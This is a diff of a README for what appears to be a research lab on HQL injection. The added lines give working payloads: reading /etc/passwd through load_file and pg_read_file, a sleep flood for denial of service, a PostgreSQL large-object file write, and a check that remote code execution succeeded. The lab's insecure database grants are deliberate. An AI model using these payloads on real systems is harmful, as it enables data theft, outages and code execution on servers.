@@ -57,14 +57,14 @@ The Python script wraps boolean expressions in a tautology/falsity frame:
 
 Given the repository query template:
 
-```
+```sql
 select count(*) from com.pdstat.hqli.entity.User1 usr
 where usr.userId = '%s' or usr.altUserId = '%s'
 ```
 
 When the script sends an `agentCode` like `0' or (exists ( from com.pdstat.hqli.entity.User1 u where 1=1 )) or '1'='2`, the final HQL becomes:
 
-```
+```sql
 select count(*) from com.pdstat.hqli.entity.User1 usr
 where usr.userId = '0' or (exists ( from com.pdstat.hqli.entity.User1 u where 1=1 )) or '1'='2'
     or usr.altUserId = '0' or (exists ( from com.pdstat.hqli.entity.User1 u where 1=1 )) or '1'='2'
@@ -321,31 +321,69 @@ docker compose down -v
 
 ## Other attack vectors
 
-Thanks to HQL's `function()` support, you can also try to detect the database vendor and version (see the `--detect-db` flag), and potentially exploit further via SQL functions. Here are some examples I've discovered across the different DBs supported by this project.:
+Thanks to HQL's `function()` support, you can also try to detect the database vendor and version (see the `--detect-db` flag), and potentially exploit further via SQL functions. Here are some examples I've discovered across the different DBs supported by this project:
+
+### MySQL/MariaDB
+
+#### File read
+
+You can read files from the filesystem using the `load_file` function. For example, to read the `/etc/passwd` file, you can use the following payload:
+
+True: (char at position 1 is 'r')
+
+`x' or function('substring', function('load_file','/etc/passwd'), 1, 1) = 'r' or '1'='2`
+
+True: (char at position 2 is 'o')
+
+`x' or function('substring', function('load_file','/etc/passwd'), 2, 1) = 'o' or '1'='2`
+
+True: (char at position 3 is 'o')
+
+`x' or function('substring', function('load_file','/etc/passwd'), 3, 1) = 'o' or '1'='2`
+
+True: (char at position 4 is 't')
+
+`x' or function('substring', function('load_file','/etc/passwd'), 4, 1) = 't' or '1'='2`
+
+etc.
+
+Note the MySQL user has to be granted the `FILE` privilege to read files outside of the MySQL data directory. In this project the `hqli` user is granted this privilege in the `docker/mysql/init.sql` file. The `--secure-file-priv=` option in the `docker-compose.yml` file disables the secure file privilege restriction, allowing reading files from anywhere the MySQL server user has access to.
+
+#### Availability
+
+You can also use the `sleep` function to cause a delay in the response, which could be used for a denial of service attack. For example, to sleep for 10 seconds, you can use the following payload:
+
+`x' or (function('sleep',10)=0) or '1'='2`
+
+Sending this continuously will flood the JDBC connection pool and cause a denial of service. See the `flood.py` script for an example of how to do this.
 
 ### PostgreSQL
 
-### File read
+#### File read
 
 Similar to how this projects script exfiltrates data via boolean HQLi, you can also read files from the filesystem using the `pg_read_file` function. For example, to read the `/etc/passwd` file, you can use the following payload:
 
 True: (char at position 1 is 'r')
+
 `x' or function('substring', function('pg_read_file','/etc/passwd'), 1, 1) = 'r' or '1'='2`
 
 True: (char at position 2 is 'o')
+
 `x' or function('substring', function('pg_read_file','/etc/passwd'), 2, 1) = 'o' or '1'='2`
 
 True: (char at position 3 is 'o')
+
 `x' or function('substring', function('pg_read_file','/etc/passwd'), 3, 1) = 'o' or '1'='2`
 
 True: (char at position 4 is 't')
+
 `x' or function('substring', function('pg_read_file','/etc/passwd'), 4, 1) = 't' or '1'='2`
 
 etc.
 
-### File write
+#### File write
 
-#### Writing 'large objects' to the filesystem
+##### Writing 'large objects' to the filesystem
 
 In PostgreSQL you can write files to the filesystem using the `lo_export` function, which exports a large object to a file.
 
@@ -354,13 +392,17 @@ In PostgreSQL you can write files to the filesystem using the `lo_export` functi
 `int lo_export(PGconn *conn, Oid lobjId, const char *filename);`
 >The lobjId argument specifies the OID of the large object to export and the filename argument specifies the operating system name of the file. Note that the file is written by the client interface library, not by the server. Returns 1 on success, -1 on failure.
 
+>These two functions read and write files in the server's file system, using the permissions of the database's owning user. Therefore, by default their use is restricted to superusers. In contrast, the client-side import and export functions read and write files in the client's file system, using the permissions of the client program.
+
+In the case of this project the PostgreSQL JDBC driver is configured with the same credentials as the database user configured in the `docker-compose.yml` file, which is the `hqli` user. So any files written to the filesystem will be written to the PostgreSQL server's filesystem.
+
 These objects exist in the `pg_largeobject` table. From the function signature above we would need to know the OID of the large object we want to export.
 
 However it seems it's possible to create a large object from a string using the `lo_from_bytea` function and then stuff its OID into a Global Unified Config (GUC) variable.
 
 For example the following payload
 
-`x' OR function('set_config','attk.loid',function('concat', function('lo_from_bytea', 0, function('decode','68656c6c6f0a','hex')), ''),false) IS NOT NULL OR '1'='2`
+`x' OR function('set_config','attk.loid',function('concat', function('lo_from_bytea', 0, function('decode','aGVsbG8K','base64')), ''),false) IS NOT NULL OR '1'='2`
 
 Creates a GUC variable called `attk.loid` with the OID of a large object containing the string "hello\n".
 
@@ -401,6 +443,10 @@ This took me down another rabbit hole! So it seems from this RCE can be achieved
 `x' OR function('pg_switch_wal') IS NOT NULL OR '1'='2`
 
 ![](./images/postgres-rce.png)
+
+We could also send a truthy payload to check for existence of the `/tmp/pwned` file to confirm the RCE worked.
+
+`x' OR function('length', function('pg_read_file','/tmp/pwned')) > 0 OR '1'='2`
 
 ### Integrity and availability attacks
 
@@ -470,13 +516,6 @@ SELECT pg_terminate_backend(<pid>);
 ```
 
 You can find the PID of a backend process by querying the `pg_stat_activity` view:
-
-```sql
-SELECT pid, usename, application_name, client_addr, state
-FROM pg_stat_activity;
-```
-
-I tested this out by first using the `psql` command line tool to connect to the PostgreSQL database via the terminal of the running Docker container. Then I ran the following query to find some active connections:
 
 ```sql
 SELECT pid, usename, application_name, client_addr, state
